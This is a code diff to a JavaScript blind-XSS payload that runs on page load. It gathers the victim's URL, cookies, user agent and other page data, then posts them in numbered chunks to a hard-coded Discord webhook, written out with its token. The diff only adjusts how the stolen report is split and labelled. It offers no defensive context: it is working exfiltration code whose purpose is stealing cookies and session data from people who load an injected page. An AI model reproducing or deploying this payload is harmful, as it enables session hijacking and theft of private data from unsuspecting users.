@@ -13,14 +13,13 @@ async function sendToDiscord(content) {
         chunks.push(content.slice(i, i + maxLength));
     }
 
-    for (const chunk of chunks) {
+    for (let i = 0; i < chunks.length; i++) {
+        const numbered = `**XSS Report Part ${i + 1}/${chunks.length}**\n${chunks[i]}`;
         try {
             await fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ content: chunk })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: numbered })
             });
         } catch (e) {
             console.error("Send failed", e);
@@ -29,7 +28,7 @@ async function sendToDiscord(content) {
 }
 
 async function x_po(t) {
-    let content = "**XSS Report**\n" +
+    let content = 
         "URL: " + prs(t.uri) + "\n" +
         "Cookies: " + prs(t.cookies) + "\n" +
         "User-Agent: " + prs(t["user-agent"]) + "\n" +
@@ -63,3 +62,4 @@ function j_ls(t, r, e) {
 
 r_Jn = {};
 "complete" == document.readyState ? x_PS() : j_ls(window, "load", function () { x_PS() });
+
